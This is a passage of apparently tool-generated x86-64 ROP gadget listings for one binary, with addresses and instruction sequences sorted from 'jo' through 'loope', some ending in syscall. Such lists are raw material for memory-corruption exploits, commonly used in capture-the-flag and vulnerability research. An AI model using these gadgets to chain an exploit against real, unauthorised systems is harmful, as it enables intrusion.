0x00000000004538b0 : jo 0x4538ba ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x0000000000470b6a : jo 0x470b82 ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000473e66 : jo 0x473ec8 ; pop rbp ; pop r12 ; ret
0x000000000047407d : jo 0x4740df ; pop rbp ; pop r12 ; ret
0x0000000000482284 : jo 0x4822ea ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004942e4 : jo 0x494347 ; stc ; jmp rax
0x00000000004945f0 : jo 0x4945a8 ; stc ; inc eax ; mov al, 0xf9 ; call qword ptr [rax]
0x0000000000494a74 : jo 0x494a83 ; cli ; jmp rax
0x0000000000494c78 : jo 0x494c86 ; cli ; jmp rax
0x0000000000494f7c : jo 0x494fb0 ; cli ; jmp rsi
0x0000000000495324 : jo 0x4952db ; cli ; inc eax ; scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rax]
0x00000000004a7b24 : jo 0x4a7b9e ; mov ebp, 0xfb67d10d ; ret
0x00000000004aeccc : jo 0x4aecd3 ; ret 0xa01
0x00000000004af4cc : jo 0x4af510 ; add byte ptr [rax], al ; add byte ptr [rax - 9], bl ; jmp qword ptr [rbx]
0x00000000004b03e0 : jo 0x4b0390 ; stc ; jmp qword ptr [rcx]
0x00000000004b3f45 : jo 0x4b3f4c ; retf
0x00000000004b42e0 : jo 0x4b42b1 ; cld ; jmp qword ptr [rsi]
0x00000000004b59cc : jo 0x4b5975 ; add byte ptr [rax], al ; mov al, 0x83 ; std ; call qword ptr [rbx]
0x0000000000457a62 : jp 0x457a5c ; ret
0x0000000000468aa4 : jp 0x468aa4 ; dec dword ptr [rax - 0x39] ; ret 0xffa0
0x00000000004a7cb3 : jp 0x4a7c6d ; xchg byte ptr [rdi - 0x7c], dl ; xchg dword ptr [rax], edi ; in eax, 0xe5 ; retf 0x2a91
0x00000000004b3405 : jp 0x4b340d ; add byte ptr [rax], bh ; and bh, ah ; jmp qword ptr [rcx]
0x0000000000419b09 : jrcxz 0x419b0c ; sub dword ptr [rax], eax ; ret
0x000000000041b4dd : jrcxz 0x41b50d ; add byte ptr [rax + 1], cl ; ret
0x000000000041b4e7 : jrcxz 0x41b517 ; add byte ptr [rax + 0x39], cl ; ret
0x000000000041b4e6 : jrcxz 0x41b518 ; add byte ptr [rax + 0x39], cl ; ret
0x000000000043549a : jrcxz 0x435495 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000435499 : jrcxz 0x435496 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000437fba : jrcxz 0x437fb5 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000437fb9 : jrcxz 0x437fb6 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000044c703 : jrcxz 0x44c6c8 ; cmp r11d, 0xa ; je 0x44c714 ; ret
0x000000000046832f : jrcxz 0x468335 ; dec dword ptr [rbp - 0x77] ; ret 0x894c
0x000000000046832e : jrcxz 0x468336 ; dec dword ptr [rbp - 0x77] ; ret 0x894c
0x000000000047fb9e : jrcxz 0x47fbec ; mov esi, ebx ; syscall
0x0000000000490354 : jrcxz 0x4903b6 ; pop rbp ; pop r12 ; ret
0x0000000000494649 : jrcxz 0x49464a ; push qword ptr [rax] ; in eax, 0xf9 ; call qword ptr [rax]
0x0000000000494669 : jrcxz 0x494666 ; jmp qword ptr [rax]
0x0000000000494668 : jrcxz 0x494667 ; jmp qword ptr [rax]
0x0000000000494689 : jrcxz 0x49468a ; inc dword ptr [rax] ; in eax, 0xf9 ; jmp rax
0x00000000004946a9 : jrcxz 0x4946a6 ; jmp rax
0x00000000004a6905 : jrcxz 0x4a695f ; ret
0x00000000004a8acd : jrcxz 0x4a8a90 ; add dword ptr [rdx - 0x36a5831f], esp ; retf
0x00000000004a9629 : jrcxz 0x4a960d ; cmp al, 0x93 ; in al, dx ; retf 0xae32
0x000000000040eab5 : js 0x40ead9 ; call rdx
0x00000000004137c8 : js 0x4137fa ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x0000000000471a09 : js 0x471a41 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x0000000000478b9a : js 0x478b99 ; dec dword ptr [rax - 0x7d] ; ret
0x000000000047bd82 : js 0x47bd95 ; pop rbx ; ret
0x000000000047d8e4 : js 0x47d8f0 ; add byte ptr [rax + 0x15], bh ; syscall
0x000000000048d4b6 : js 0x48d4c3 ; add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x000000000048d4c3 : js 0x48d4cf ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000000490183 : js 0x4901fe ; ret 0x8b48
0x0000000000492284 : js 0x492287 ; dec dword ptr [rcx - 0x73] ; and byte ptr [rax - 0x7d], cl ; retf
0x00000000004967f5 : js 0x4967f4 ; call qword ptr [rdi]
0x00000000004a5058 : js 0x4a50da ; std ; call qword ptr [rax]
0x00000000004a8a08 : js 0x4a89dc ; movsxd rbx, dword ptr [rsi + rax*8 + 0x74] ; retf 0x93a2
0x00000000004a89a1 : js 0x4a8a21 ; pop rdx ; retf
0x00000000004b1a48 : js 0x4b19e7 ; cli ; call qword ptr [rcx]
0x00000000004b318d : js 0x4b3195 ; add byte ptr [rax], al ; adc edi, esp ; jmp qword ptr [rax]
0x00000000004b4ad4 : js 0x4b4a6e ; add byte ptr [rax], al ; add al, 0xfd ; jmp rdx
0x000000000046b333 : lahf ; add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret
0x0000000000456cb5 : lahf ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xb2eb
0x000000000041f94f : lahf ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x00000000004a8fe3 : lahf ; mov dh, 0xc7 ; ret 0xe71f
0x000000000047e81b : lahf ; mov eax, dword ptr [rdx + 4] ; ret
0x00000000004400dd : lahf ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000045ebdf : lahf ; or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x00000000004a88d2 : lahf ; or dword ptr [rbp + 0x68], edi ; mov ch, 0x41 ; outsb dx, byte ptr [rsi] ; sbb edi, ebp ; retf
0x00000000004a90d4 : lahf ; push -0x57d3205 ; call 0xffffffffab585bd6
0x00000000004a70e0 : lahf ; push -0x5e ; cld ; shr al, cl ; add al, 0x3d ; retf
0x000000000044b30b : lahf ; ret
0x00000000004195cf : lahf ; ret 0x3949
0x0000000000419682 : lahf ; ret 0x48e9
0x000000000044b1c1 : lahf ; ret 0x8545
0x00000000004a683d : lahf ; ret 0x871e
0x0000000000448999 : lahf ; ret 0xea81
0x000000000048c871 : lahf ; ret 0xf45
0x0000000000403895 : lahf ; retf
0x00000000004b5f39 : lahf ; std ; jmp qword ptr [rax]
0x000000000044076d : lar eax, word ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041b472 : lcall [rbx + 0x48] ; mov eax, edi ; pop rbp ; pop r12 ; ret
0x000000000044ea6d : lcall [rbx + 0x5d] ; pop r12 ; jmp 0x45b4e7
0x0000000000419cd0 : lcall [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000412835 : lcall [rbx + 0x5d] ; pop r12 ; ret
0x00000000004125bb : lcall [rbx + 0x5d] ; ret
0x000000000047fe46 : lcall [rbx + 0x64] ; mov eax, dword ptr [rax] ; ret
0x0000000000410eee : lcall [rbx - 0x77] ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; pop r13 ; ret
0x00000000004967f3 : lcall [rsi + 0x78] ; sti ; call qword ptr [rdi]
0x0000000000494347 : lcall [rsi - 0x5f00066b] ; xchg eax, esi ; stc ; call rcx
0x00000000004967bb : lcall [rsi] ; jns 0x4967be ; jmp rsi
0x0000000000495943 : lcall [rsi] ; sti ; call qword ptr [rsi]
0x0000000000435b26 : lddqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000041831b : lea eax, [r8 - 1] ; ret
0x000000000048af6c : lea eax, [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x000000000042bcc4 : lea eax, [rax + rdi + 0x10] ; ret
0x000000000042bcd4 : lea eax, [rax + rdi + 0x20] ; ret
0x000000000042bca4 : lea eax, [rax + rdi - 0x10] ; ret
0x000000000041831c : lea eax, [rax - 1] ; ret
0x000000000047351d : lea eax, [rcx + rsi] ; ret
0x0000000000447184 : lea eax, [rcx - 1] ; ret
0x00000000004451fc : lea eax, [rdi + 0x10] ; ret
0x0000000000445211 : lea eax, [rdi + 0x11] ; ret
0x000000000044522f : lea eax, [rdi + 0x12] ; ret
0x000000000044524f : lea eax, [rdi + 0x13] ; ret
0x0000000000445272 : lea eax, [rdi + 0x14] ; ret
0x0000000000445291 : lea eax, [rdi + 0x15] ; ret
0x00000000004452b1 : lea eax, [rdi + 0x16] ; ret
0x00000000004452d1 : lea eax, [rdi + 0x17] ; ret
0x00000000004452f4 : lea eax, [rdi + 0x18] ; ret
0x0000000000445319 : lea eax, [rdi + 0x19] ; ret
0x0000000000445337 : lea eax, [rdi + 0x1a] ; ret
0x0000000000445357 : lea eax, [rdi + 0x1b] ; ret
0x0000000000445373 : lea eax, [rdi + 0x1c] ; ret
0x0000000000445393 : lea eax, [rdi + 0x1d] ; ret
0x00000000004453b3 : lea eax, [rdi + 0x1e] ; ret
0x00000000004453d3 : lea eax, [rdi + 0x1f] ; ret
0x000000000044514d : lea eax, [rdi + 0xa] ; ret
0x000000000044516d : lea eax, [rdi + 0xb] ; ret
0x000000000044518f : lea eax, [rdi + 0xc] ; ret
0x00000000004451af : lea eax, [rdi + 0xd] ; ret
0x00000000004451cf : lea eax, [rdi + 0xe] ; ret
0x00000000004451e9 : lea eax, [rdi + 0xf] ; ret
0x0000000000445097 : lea eax, [rdi + 1] ; ret
0x00000000004450aa : lea eax, [rdi + 2] ; ret
0x00000000004450b5 : lea eax, [rdi + 3] ; ret
0x00000000004450c8 : lea eax, [rdi + 4] ; ret
0x00000000004450dd : lea eax, [rdi + 5] ; ret
0x00000000004450fb : lea eax, [rdi + 6] ; ret
0x0000000000445107 : lea eax, [rdi + 7] ; ret
0x000000000044511a : lea eax, [rdi + 8] ; ret
0x000000000044512f : lea eax, [rdi + 9] ; ret
0x000000000042bcf9 : lea eax, [rdi + rax + 0x10] ; ret
0x000000000042bd09 : lea eax, [rdi + rax + 0x20] ; ret
0x000000000042bc03 : lea eax, [rdi + rax + 0x30] ; ret
0x0000000000473765 : lea eax, [rdi + rax - 0x20] ; vzeroupper ; ret
0x0000000000440c67 : lea eax, [rdi + rax] ; ret
0x00000000004474da : lea eax, [rdi + rcx] ; sub rax, rsi ; ret
0x0000000000473419 : lea eax, [rdi + rsi] ; ret
0x0000000000445083 : lea eax, [rdi] ; ret
0x000000000044466d : lea eax, [rdx + 0xa] ; ret
0x000000000044468d : lea eax, [rdx + 0xb] ; ret
0x00000000004446af : lea eax, [rdx + 0xc] ; ret
0x00000000004446cf : lea eax, [rdx + 0xd] ; ret
0x00000000004446ef : lea eax, [rdx + 0xe] ; ret
0x000000000044457f : lea eax, [rdx + 0xf] ; ret
0x00000000004445a7 : lea eax, [rdx + 1] ; ret
0x00000000004445bd : lea eax, [rdx + 2] ; ret
0x00000000004445d5 : lea eax, [rdx + 3] ; ret
0x00000000004445eb : lea eax, [rdx + 4] ; ret
0x00000000004445fd : lea eax, [rdx + 5] ; ret
0x000000000044461b : lea eax, [rdx + 6] ; ret
0x0000000000444527 : lea eax, [rdx + 7] ; ret
0x000000000044462d : lea eax, [rdx + 8] ; ret
0x000000000044464d : lea eax, [rdx + 9] ; ret
0x000000000041830e : lea eax, [rdx + rdi] ; ret
0x0000000000448ab3 : lea eax, [rdx + rdx] ; pop rbx ; and eax, 0x7ff80000 ; ret
0x0000000000423696 : lea eax, [rdx - 0x10] ; ret
0x0000000000444595 : lea eax, [rdx] ; ret
0x0000000000425108 : lea eax, [rip + 0x1bb12] ; cmove rax, rdx ; ret
0x00000000004241a8 : lea eax, [rip + 0x1d0a2] ; cmove rax, rdx ; ret
0x0000000000424cbf : lea eax, [rip + 0x221ab] ; cmove rax, rdx ; ret
0x0000000000425048 : lea eax, [rip + 0x22732] ; cmovne rax, rdx ; ret
0x0000000000424f08 : lea eax, [rip + 0x22862] ; cmovne rax, rdx ; ret
0x0000000000424da8 : lea eax, [rip + 0x229d2] ; cmovne rax, rdx ; ret
0x00000000004250af : lea eax, [rip + 0x22a7b] ; cmovne rax, rdx ; ret
0x0000000000424f6f : lea eax, [rip + 0x22bab] ; cmovne rax, rdx ; ret
0x0000000000424e0f : lea eax, [rip + 0x22d1b] ; cmovne rax, rdx ; ret
0x000000000042508e : lea eax, [rip + 0x22ecc] ; cmovne rax, rdx ; ret
0x0000000000424f4e : lea eax, [rip + 0x22ffc] ; cmovne rax, rdx ; ret
0x0000000000424dee : lea eax, [rip + 0x2316c] ; cmovne rax, rdx ; ret
0x000000000042412f : lea eax, [rip + 0x231db] ; cmovne rax, rdx ; ret
0x0000000000424e7a : lea eax, [rip + 0x23660] ; cmovne rax, rdx ; ret
0x0000000000424e5d : lea eax, [rip + 0x237dd] ; cmovne rax, rdx ; ret
0x0000000000424eae : lea eax, [rip + 0x2390c] ; cmovne rax, rdx ; ret
0x000000000044dcd1 : lea eax, [rip + 0x26c629] ; ret
0x00000000004851ff : lea eax, [rip + 0x5b] ; cmovne rax, rdx ; ret
0x00000000004250d8 : lea eax, [rip + 0x6c52] ; cmove rax, rdx ; ret
0x0000000000424ce8 : lea eax, [rip + 0x6d12] ; cmove rax, rdx ; ret
0x0000000000424d4c : lea eax, [rip + 0x79ee] ; je 0x424d23 ; ret
0x0000000000472938 : lea eax, [rip + 0x9f2] ; cmove rax, rdx ; ret
0x0000000000473d48 : lea eax, [rip + 0xa22] ; cmove rax, rdx ; ret
0x0000000000472908 : lea eax, [rip + 0xee2] ; cmove rax, rdx ; ret
0x000000000046b45c : lea eax, [rsi + 8] ; mov qword ptr [rdx + 8], rax ; jmp 0x46b438
0x000000000045f861 : lea ebp, [rdx] ; add al, byte ptr [rax] ; add byte ptr [rax + 0x63], cl ; ret
0x000000000040e141 : lea ebx, [rdi + rax] ; mov rax, qword ptr [rsp + 8] ; call rax
0x00000000004a70f1 : lea ebx, [rsi - 0x3271f33] ; test al, 0x97 ; xchg eax, esp ; ret
0x0000000000473f1b : lea ecx, [rax + 1] ; call rbx
0x00000000004740b6 : lea ecx, [rax + 4] ; lea r9, [rsp + 0x20] ; call rbx
0x0000000000472354 : lea ecx, [rbp - 0x40] ; mov rdi, r15 ; call r12
0x000000000042e210 : lea ecx, [rbx + rcx] ; jmp r9
0x000000000044491e : lea ecx, [rbx + rcx] ; jmp rcx
0x0000000000468f24 : lea ecx, [rbx + rdx] ; add rdx, r12 ; call qword ptr [r10 + rax*8]
0x0000000000485a34 : lea ecx, [rdx + rcx*8] ; jmp 0x485a46
0x00000000004236a6 : lea ecx, [rdx - 8] ; cmovne rax, rcx ; ret
0x0000000000484510 : lea ecx, [rdx] ; jmp 0x484566
0x0000000000488310 : lea ecx, [rdx] ; jmp 0x488366
0x0000000000475b47 : lea ecx, [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x0000000000472160 : lea ecx, [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x000000000047207b : lea ecx, [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x000000000047403e : lea ecx, [rsp + 0x20] ; call rbx
0x000000000047422c : lea ecx, [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x0000000000473f16 : lea ecx, [rsp + 0x38] ; lea rcx, [rax + 1] ; call rbx
0x000000000044cfbf : lea edi, [rcx + rax + 0x20] ; jmp rdx
0x0000000000418c31 : lea edx, [rax + 0x60] ; mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x0000000000485a30 : lea edx, [rax + 8] ; lea rcx, [rdx + rcx*8] ; jmp 0x485a4a
0x0000000000471ed7 : lea edx, [rax + rdx*4] ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x000000000042e2e4 : lea edx, [rbx + rdx] ; jmp rdx
0x00000000004251a6 : lea edx, [rdx + rcx] ; jmp r10
0x000000000042e6d8 : lea edx, [rdx - 0x40] ; jmp r9
0x0000000000424dc3 : lea edx, [rip + 0x11407] ; cmovne rax, rdx ; ret
0x000000000042410f : lea edx, [rip + 0x1d62b] ; cmovne rax, rdx ; ret
0x0000000000424f9f : lea edx, [rip + 0x1df4b] ; cmovne rax, rdx ; ret
0x0000000000424d34 : lea edx, [rip + 0x209c6] ; cmovne rax, rdx ; ret
0x00000000004240a8 : lea edx, [rip + 0x21332] ; cmovne rax, rdx ; ret
0x00000000004240df : lea edx, [rip + 0x272b] ; cmovne rax, rdx ; ret
0x000000000047447a : lea edx, [rip + 0x30] ; cmovne rax, rdx ; ret
0x00000000004241e9 : lea edx, [rip + 0x50d1] ; cmovne rax, rdx ; ret
0x0000000000425063 : lea edx, [rip + 0xe697] ; cmovne rax, rdx ; ret
0x0000000000424f23 : lea edx, [rip + 0xe7b7] ; cmovne rax, rdx ; ret
0x000000000048dde1 : lea esi, [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x000000000046b8ad : lea esi, [rip + 0x24b56d] ; jmp rax
0x00000000004477ff : lea esi, [rsi + rcx - 1] ; std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x000000000047e336 : lea esp, [rbx + rdi*8 - 0x76b30001] ; ret 0x2948
0x00000000004251a5 : lea r10, [r10 + r9] ; jmp r10
0x000000000048dde0 : lea r14, [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x000000000042e20f : lea r9, [r11 + r9] ; jmp r9
0x0000000000472353 : lea r9, [rbp - 0x40] ; mov rdi, r15 ; call r12
0x000000000048450f : lea r9, [rdx] ; jmp 0x484567
0x000000000048830f : lea r9, [rdx] ; jmp 0x488367
0x000000000047215f : lea r9, [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x000000000047207a : lea r9, [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x000000000047403d : lea r9, [rsp + 0x20] ; call rbx
0x000000000047422b : lea r9, [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x0000000000473f15 : lea r9, [rsp + 0x38] ; lea rcx, [rax + 1] ; call rbx
0x000000000048af6b : lea rax, [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x000000000042bcc3 : lea rax, [rax + rdi + 0x10] ; ret
0x000000000042bcd3 : lea rax, [rax + rdi + 0x20] ; ret
0x000000000042bca3 : lea rax, [rax + rdi - 0x10] ; ret
0x000000000047351c : lea rax, [rcx + rsi] ; ret
0x0000000000447183 : lea rax, [rcx - 1] ; ret
0x00000000004451fb : lea rax, [rdi + 0x10] ; ret
0x0000000000445210 : lea rax, [rdi + 0x11] ; ret
0x000000000044522e : lea rax, [rdi + 0x12] ; ret
0x000000000044524e : lea rax, [rdi + 0x13] ; ret
0x0000000000445271 : lea rax, [rdi + 0x14] ; ret
0x0000000000445290 : lea rax, [rdi + 0x15] ; ret
0x00000000004452b0 : lea rax, [rdi + 0x16] ; ret
0x00000000004452d0 : lea rax, [rdi + 0x17] ; ret
0x00000000004452f3 : lea rax, [rdi + 0x18] ; ret
0x0000000000445318 : lea rax, [rdi + 0x19] ; ret
0x0000000000445336 : lea rax, [rdi + 0x1a] ; ret
0x0000000000445356 : lea rax, [rdi + 0x1b] ; ret
0x0000000000445372 : lea rax, [rdi + 0x1c] ; ret
0x0000000000445392 : lea rax, [rdi + 0x1d] ; ret
0x00000000004453b2 : lea rax, [rdi + 0x1e] ; ret
0x00000000004453d2 : lea rax, [rdi + 0x1f] ; ret
0x000000000044514c : lea rax, [rdi + 0xa] ; ret
0x000000000044516c : lea rax, [rdi + 0xb] ; ret
0x000000000044518e : lea rax, [rdi + 0xc] ; ret
0x00000000004451ae : lea rax, [rdi + 0xd] ; ret
0x00000000004451ce : lea rax, [rdi + 0xe] ; ret
0x00000000004451e8 : lea rax, [rdi + 0xf] ; ret
0x0000000000445096 : lea rax, [rdi + 1] ; ret
0x00000000004450a9 : lea rax, [rdi + 2] ; ret
0x00000000004450b4 : lea rax, [rdi + 3] ; ret
0x00000000004450c7 : lea rax, [rdi + 4] ; ret
0x00000000004450dc : lea rax, [rdi + 5] ; ret
0x00000000004450fa : lea rax, [rdi + 6] ; ret
0x0000000000445106 : lea rax, [rdi + 7] ; ret
0x0000000000445119 : lea rax, [rdi + 8] ; ret
0x000000000044512e : lea rax, [rdi + 9] ; ret
0x000000000042bcf8 : lea rax, [rdi + rax + 0x10] ; ret
0x000000000042bd08 : lea rax, [rdi + rax + 0x20] ; ret
0x000000000042bc02 : lea rax, [rdi + rax + 0x30] ; ret
0x0000000000473764 : lea rax, [rdi + rax - 0x20] ; vzeroupper ; ret
0x0000000000440c66 : lea rax, [rdi + rax] ; ret
0x00000000004474d9 : lea rax, [rdi + rcx] ; sub rax, rsi ; ret
0x0000000000473418 : lea rax, [rdi + rsi] ; ret
0x0000000000445082 : lea rax, [rdi] ; ret
0x000000000044466c : lea rax, [rdx + 0xa] ; ret
0x000000000044468c : lea rax, [rdx + 0xb] ; ret
0x00000000004446ae : lea rax, [rdx + 0xc] ; ret
0x00000000004446ce : lea rax, [rdx + 0xd] ; ret
0x00000000004446ee : lea rax, [rdx + 0xe] ; ret
0x000000000044457e : lea rax, [rdx + 0xf] ; ret
0x00000000004445a6 : lea rax, [rdx + 1] ; ret
0x00000000004445bc : lea rax, [rdx + 2] ; ret
0x00000000004445d4 : lea rax, [rdx + 3] ; ret
0x00000000004445ea : lea rax, [rdx + 4] ; ret
0x00000000004445fc : lea rax, [rdx + 5] ; ret
0x000000000044461a : lea rax, [rdx + 6] ; ret
0x0000000000444526 : lea rax, [rdx + 7] ; ret
0x000000000044462c : lea rax, [rdx + 8] ; ret
0x000000000044464c : lea rax, [rdx + 9] ; ret
0x0000000000423695 : lea rax, [rdx - 0x10] ; ret
0x0000000000444594 : lea rax, [rdx] ; ret
0x000000000044dcd0 : lea rax, [rip + 0x26c629] ; ret
0x000000000046b45b : lea rax, [rsi + 8] ; mov qword ptr [rdx + 8], rax ; jmp 0x46b439
0x000000000040e140 : lea rbx, [r15 + rax] ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000044491d : lea rcx, [r11 + rcx] ; jmp rcx
0x0000000000473f1a : lea rcx, [rax + 1] ; call rbx
0x00000000004740b5 : lea rcx, [rax + 4] ; lea r9, [rsp + 0x20] ; call rbx
0x0000000000485a33 : lea rcx, [rdx + rcx*8] ; jmp 0x485a47
0x00000000004236a5 : lea rcx, [rdx - 8] ; cmovne rax, rcx ; ret
0x0000000000475b46 : lea rcx, [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x000000000044cfbe : lea rdi, [rcx + rax + 0x20] ; jmp rdx
0x000000000042e2e3 : lea rdx, [r11 + rdx] ; jmp rdx
0x0000000000485a2f : lea rdx, [rax + 8] ; lea rcx, [rdx + rcx*8] ; jmp 0x485a4b
0x000000000042e6d7 : lea rdx, [rdx - 0x40] ; jmp r9
0x000000000046b8ac : lea rsi, [rip + 0x24b56d] ; jmp rax
0x00000000004477fe : lea rsi, [rsi + rcx - 1] ; std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x000000000042a737 : leave ; add al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000449864 : leave ; add byte ptr es:[rax + 0x39], cl ; ret
0x000000000042b617 : leave ; add eax, dword ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004581fa : leave ; call r15
0x00000000004b4215 : leave ; cld ; call rdx
0x00000000004b4201 : leave ; cld ; jmp qword ptr [rcx]
0x0000000000446f60 : leave ; jne 0x446f53 ; ret
0x0000000000447010 : leave ; jne 0x447003 ; ret
0x00000000004472d0 : leave ; jne 0x4472c7 ; sub rax, 1 ; ret
0x000000000047474a : leave ; jne 0x474707 ; mov rax, rdx ; ret
0x00000000004474d8 : leave ; lea rax, [rdi + rcx] ; sub rax, rsi ; ret
0x000000000048af20 : leave ; movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x000000000046bdc9 : leave ; movzx eax, byte ptr [rdi + rax] ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x0000000000400bd0 : leave ; ret
0x00000000004a8ad4 : leave ; retf
0x00000000004a72a1 : leave ; retf 0x6ee8
0x00000000004a63c9 : leave ; retf 0xcccb
0x00000000004947c5 : leave ; stc ; call rax
0x000000000047403a : leave ; xor edx, edx ; lea r9, [rsp + 0x20] ; call rbx
0x00000000004959b7 : ljmp [rax + 0x43] ; sti ; jmp qword ptr [rcx]
0x00000000004a4f43 : ljmp [rax + 0x73] ; std ; jmp qword ptr [rax]
0x00000000004967eb : ljmp [rax + 0x76] ; sti ; call qword ptr [rdx]
0x00000000004948bb : ljmp [rbx + rdx - 6] ; call qword ptr [rdx]
0x000000000049593f : ljmp [rbx] ; sti ; lcall [rsi] ; sti ; call qword ptr [rsi]
0x0000000000495a8b : ljmp [rdi + 0x44] ; sti ; inc dword ptr [rdx + 0x44] ; sti ; call rdi
0x00000000004949f7 : ljmp [rdx + 0x3afffa13] ; adc edi, edx ; jmp rax
0x00000000004950ff : ljmp [rdx + 0x50fffa2e] ; cli ; call rax
0x00000000004499bd : ljmp [rdx - 5] ; dec dword ptr [rax - 0x77] ; ret
0x000000000042cefe : lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000047f307 : lock inc dword ptr [r9 + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000410a20 : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00000000004468e0 : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add dh, dh ; ret 0x7501
0x00000000004add08 : lodsb al, byte ptr [rsi] ; and eax, dword ptr [rax] ; add byte ptr [rbx + rsi*4 - 0xa], dl ; call qword ptr [rdi]
0x00000000004a89c6 : lodsb al, byte ptr [rsi] ; loop 0x4a8993 ; retf
0x000000000042ad34 : lodsb al, byte ptr [rsi] ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004a977d : lodsb al, byte ptr [rsi] ; or byte ptr [rdi + 0x26], al ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x0000000000449b40 : lodsb al, byte ptr [rsi] ; push rbx ; cld ; dec dword ptr [rax - 0x77] ; ret 0x8b48
0x000000000041055b : lodsb al, byte ptr [rsi] ; ret 0x2a
0x00000000004b045d : lodsb al, byte ptr [rsi] ; stc ; call rsi
0x00000000004945e9 : lodsb al, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x00000000004a6ffb : lodsb al, byte ptr [rsi] ; xchg eax, edx ; pop rbx ; retf
0x00000000004612cf : lodsd eax, dword ptr [rsi] ; add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], al ; retf 0xe9ff
0x00000000004a8da5 : lodsd eax, dword ptr [rsi] ; mov esi, 0x497b96cc ; retf 0x99e0
0x0000000000483002 : lodsd eax, dword ptr [rsi] ; ret
0x0000000000494629 : lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rax - 0x1f000652]
0x0000000000412b0d : loop 0x412b0f ; add rdx, rcx ; jmp 0x412b25
0x000000000042233e : loop 0x422391 ; mov esi, ebx ; mov rdi, r13 ; call 0x41e589
0x00000000004267fd : loop 0x426835 ; shr byte ptr [rcx], 0xc8 ; ret
0x000000000043540a : loop 0x435405 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000435409 : loop 0x435406 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000437f2a : loop 0x437f25 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000437f29 : loop 0x437f26 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000448a7f : loop 0x448a99 ; movsxd rax, dword ptr [rsi + rdx*4] ; add rax, rsi ; jmp rax
0x000000000044c953 : loop 0x44c9a6 ; mov dword ptr [rax + 0x20], ecx ; mov byte ptr [rax + 0x28], 1 ; ret
0x0000000000468f29 : loop 0x468f70 ; call qword ptr [rdx + rax*8]
0x000000000047290a : loop 0x472921 ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000047290a : loop 0x472922 ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000047597e : loop 0x475946 ; add dword ptr [rax + rax], edx ; mov eax, ecx ; syscall
0x0000000000487271 : loop 0x48727c ; add rdx, rax ; jmp 0x487285
0x000000000048d219 : loop 0x48d268 ; add esp, 0x18 ; ret
0x0000000000494709 : loop 0x49470a ; inc dword ptr [rax - 0x1c] ; stc ; jmp qword ptr [rax]
0x0000000000494729 : loop 0x49472a ; inc dword ptr [rax] ; in al, 0xf9 ; jmp rax
0x00000000004a89c7 : loop 0x4a8992 ; retf
0x00000000004a9b1a : loop 0x4a9b6f ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x0000000000400bcb : loope 0x400bc6 ; add byte ptr [rax], al ; nop ; leave ; ret
0x000000000041b6ff : loope 0x41b72f ; add byte ptr [rax + 0x39], cl ; ret
0x000000000043537a : loope 0x435375 ; movq qword ptr [rdi - 0x10], mm1 ; ret
